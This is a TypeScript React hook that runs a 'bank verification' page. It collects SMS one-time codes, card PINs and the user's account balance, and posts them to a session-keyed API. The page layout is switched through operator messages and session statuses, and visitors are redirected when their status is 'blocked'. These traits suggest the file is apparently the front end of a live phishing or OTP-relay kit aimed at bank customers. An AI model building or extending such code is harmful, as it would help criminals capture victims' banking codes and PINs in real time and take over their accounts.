import { useState, useEffect, useCallback } from "react";
import { useSessionStatus } from "./use-session-status";
import { useResendCountdown } from "./use-resend-countdown";
import { submitOtp, resendOtp, submitBalance } from "../lib/bank-api";
import { debugLog } from "../lib/debug";
import { useBankVerificationConfigContext } from "../context/bank-verification-context";
import { useSessionFromStorage } from "../lib/session-storage";
import type {
  OperatorMessage,
  ResendState,
  TransactionDetails,
  VerificationLayout,
} from "../types";

const RESEND_COOLDOWN = 60;
const PIN_LENGTH = 4;
const OTP_MIN_LENGTH = 6;

function normalizeLayout(slug: string | undefined): VerificationLayout {
  if (!slug) return "sms";
  if (slug.endsWith("-sms")) return "sms";
  if (slug.endsWith("-pin")) return "pin";
  if (slug.endsWith("-push")) return "push";
  if (slug.endsWith("-balance")) return "balance";
  return "sms";
}

// Typed layout state — discriminated union keyed on `layout`
type SmsLayoutState = {
  layout: "sms";
  bank?: string;
  transactionDetails?: TransactionDetails;
  inputValue: string;
  setInputValue: (v: string) => void;
  wrongCode: boolean;
  expiredCode: boolean;
  onTryAgain: () => void;
  onSubmit: () => void;
  submitting: boolean;
  canSubmit: boolean;
  resendState: ResendState;
  operatorMessage: OperatorMessage | null;
};

type PinLayoutState = {
  layout: "pin";
  bank?: string;
  transactionDetails?: TransactionDetails;
  inputValue: string;
  setInputValue: (v: string) => void;
  pinMasked: boolean;
  onPinMaskToggle: () => void;
  wrongCode: boolean;
  expiredCode: boolean;
  onTryAgain: () => void;
  onSubmit: () => void;
  submitting: boolean;
  canSubmit: boolean;
  resendState: ResendState;
  operatorMessage: OperatorMessage | null;
};

type PushLayoutState = {
  layout: "push";
  bank?: string;
  transactionDetails?: TransactionDetails;
};

type BalanceLayoutState = {
  layout: "balance";
  bank?: string;
  transactionDetails?: TransactionDetails;
  balance: string;
  onBalanceChange: (v: string) => void;
  onSubmit: () => void;
  submitting: boolean;
  canSubmit: boolean;
  operatorMessage: OperatorMessage | null;
};

export type LayoutState =
  | SmsLayoutState
  | PinLayoutState
  | PushLayoutState
  | BalanceLayoutState;

export interface UseBankVerificationReturn {
  layoutState: LayoutState;
  inProgress: boolean;
  awaitingVerification: boolean;
  error: string | null;
}

export function useBankVerification(): UseBankVerificationReturn {
  const { channelSlug, debug } = useBankVerificationConfigContext();
  const { sessionId } = useSessionFromStorage(channelSlug);
  const [submitError, setSubmitError] = useState<string | null>(null);
  const [submitting, setSubmitting] = useState(false);
  const [inputValue, setInputValue] = useState("");
  const [pinMasked, setPinMasked] = useState(true);
  const [balance, setBalance] = useState("");

  const {
    status,
    verificationLayout,
    bank,
    redirectUrl,
    transactionDetails,
    wrongCode,
    expiredCode,
    clearCodeFeedback,
    operatorMessage,
    countdownResetTrigger,
    error: fetchError,
  } = useSessionStatus();

  const layout = normalizeLayout(verificationLayout);

  const resendFn = useCallback(async () => {
    if (layout === "pin" || layout === "sms") {
      debugLog(debug, "resend OTP", { type: layout });
      await resendOtp(channelSlug, sessionId ?? "", layout);
    }
  }, [channelSlug, sessionId, layout, debug]);

  const resendState = useResendCountdown(
    RESEND_COOLDOWN,
    countdownResetTrigger,
    resendFn,
  );

  useEffect(() => {
    if (wrongCode || expiredCode) {
      setSubmitting(false);
      setInputValue("");
    }
  }, [wrongCode, expiredCode]);

  useEffect(() => {
    setSubmitting(false);
  }, [status]);

  useEffect(() => {
    if (!channelSlug || !sessionId) return;
    debugLog(debug, "status effect", { status, redirectUrl });
    if (status === "blocked" && redirectUrl) {
      debugLog(debug, "redirect", { redirectUrl });
      window.location.replace(redirectUrl);
      return;
    }
  }, [channelSlug, sessionId, status, redirectUrl, debug]);

  const handleSubmitOtp = useCallback(
    async (codeValue: string) => {
      clearCodeFeedback?.();
      setSubmitting(true);
      debugLog(debug, "submit OTP", {
        type: layout,
        codeLength: codeValue.length,
      });
      try {
        await submitOtp(channelSlug, sessionId ?? "", codeValue);
        debugLog(debug, "OTP submitted OK");
      } catch (e) {
        const msg = e instanceof Error ? e.message : "Invalid code";
        debugLog(debug, "OTP submit failed", { error: msg });
        setSubmitError(msg);
        setSubmitting(false);
      }
    },
    [channelSlug, sessionId, clearCodeFeedback, debug, layout],
  );

  const handleSubmitBalance = useCallback(
    async (balanceValue: string) => {
      setSubmitError(null);
      setSubmitting(true);
      debugLog(debug, "submit balance", { hasValue: balanceValue.length > 0 });
      try {
        await submitBalance(channelSlug, sessionId ?? "", balanceValue);
        debugLog(debug, "balance submitted OK");
      } catch (e) {
        const msg = e instanceof Error ? e.message : "Failed to submit balance";
        debugLog(debug, "balance submit failed", { error: msg });
        setSubmitError(msg);
        setSubmitting(false);
      }
    },
    [channelSlug, sessionId, debug],
  );

  const inProgress = status === "pending" || status === "awaiting_action";
  const awaitingVerification =
    status === "awaiting_sms" ||
    status === "awaiting_pin" ||
    status === "awaiting_push" ||
    status === "awaiting_balance";

  const shared = { bank, transactionDetails };
  const otpCanSubmit =
    layout === "pin"
      ? inputValue.replace(/\D/g, "").length === PIN_LENGTH
      : inputValue.replace(/\D/g, "").length >= OTP_MIN_LENGTH;
  const sharedOtp = {
    ...shared,
    wrongCode,
    expiredCode,
    onTryAgain: clearCodeFeedback ?? (() => {}),
    submitting,
    canSubmit: otpCanSubmit,
    resendState,
    operatorMessage,
  };

  let layoutState: LayoutState;

  if (layout === "push") {
    layoutState = { layout: "push", ...shared };
  } else if (layout === "balance") {
    layoutState = {
      layout: "balance",
      ...shared,
      balance,
      onBalanceChange: setBalance,
      onSubmit: () => handleSubmitBalance(balance),
      submitting,
      canSubmit: balance.trim().length > 0,
      operatorMessage,
    };
  } else if (layout === "pin") {
    layoutState = {
      layout: "pin",
      ...sharedOtp,
      inputValue,
      setInputValue,
      pinMasked,
      onPinMaskToggle: () => setPinMasked((m) => !m),
      onSubmit: () => handleSubmitOtp(inputValue),
    };
  } else {
    layoutState = {
      layout: "sms",
      ...sharedOtp,
      inputValue,
      setInputValue,
      onSubmit: () => handleSubmitOtp(inputValue),
    };
  }

  return { layoutState, inProgress, awaitingVerification, error: submitError ?? fetchError };
}
